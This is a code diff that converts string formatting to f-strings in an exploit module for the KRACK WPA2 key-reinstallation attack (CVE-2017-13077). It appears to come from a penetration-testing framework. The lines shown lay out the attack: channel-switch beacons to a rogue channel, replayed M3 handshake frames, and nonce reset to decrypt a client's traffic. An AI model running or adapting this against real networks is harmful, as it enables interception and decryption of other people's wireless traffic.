@@ -99,7 +99,7 @@ def _parse_mac(mac_str):
 
 
 def _mac_to_str(mac_bytes):
-    return ":".join("{:02x}".format(b) for b in mac_bytes)
+    return ":".join(f"{b:02x}" for b in mac_bytes)
 
 
 class Exploit(Exploit):
@@ -159,7 +159,7 @@ class Exploit(Exploit):
     @multi
     def run(self):
         print_status("KRACK (CVE-2017-13077) - PTK reinstallation attack")
-        print_info("Target client: {}".format(self.target))
+        print_info(f"Target client: {self.target}")
         print_info("Target AP: {} ({})".format(self.bssid, self.ssid or "unknown"))
 
         ap_mac = _parse_mac(self.bssid)
@@ -173,10 +173,8 @@ class Exploit(Exploit):
             ap_mac, self.ssid or "target",
             int(self.rogue_channel), int(self.channel),
         )
-        print_info("CSA beacon: {} bytes (ch {} -> {})".format(
-            len(csa_frame), self.channel, self.rogue_channel,
-        ))
-        print_info("CSA hex: {}".format(csa_frame[:40].hex()))
+        print_info(f"CSA beacon: {len(csa_frame)} bytes (ch {self.channel} -> {self.rogue_channel})")
+        print_info(f"CSA hex: {csa_frame[:40].hex()}")
 
         print_status("Phase 2: Constructing M3 replay frames")
         anonce = os.urandom(32)
@@ -212,17 +210,15 @@ class Exploit(Exploit):
         print_table(headers, *rows)
 
         print_info("Attack sequence:")
-        print_info("  1. Broadcast CSA beacons to move client to rogue channel {}".format(self.rogue_channel))
-        print_info("  2. Relay real M1, M2 between AP (ch {}) and client (ch {})".format(
-            self.channel, self.rogue_channel,
-        ))
+        print_info(f"  1. Broadcast CSA beacons to move client to rogue channel {self.rogue_channel}")
+        print_info(f"  2. Relay real M1, M2 between AP (ch {self.channel}) and client (ch {self.rogue_channel})")
         print_info("  3. Intercept M3, forward to client")
-        print_info("  4. Replay M3 {} time(s) to force PTK reinstallation".format(self.m3_replays))
+        print_info(f"  4. Replay M3 {self.m3_replays} time(s) to force PTK reinstallation")
         print_info("  5. Client resets nonce counter, enabling decryption")
 
         print_warning("CVE-2017-13077: PTK reinstallation enables frame decryption")
         print_info("Cipher impact: CCMP = plaintext recovery; TKIP = injection + decryption")
         print_info(
-            "To execute: use interface '{}' with injection capability on "
-            "channels {} and {}".format(self.interface, self.channel, self.rogue_channel)
+            f"To execute: use interface '{self.interface}' with injection capability on "
+            f"channels {self.channel} and {self.rogue_channel}"
         )
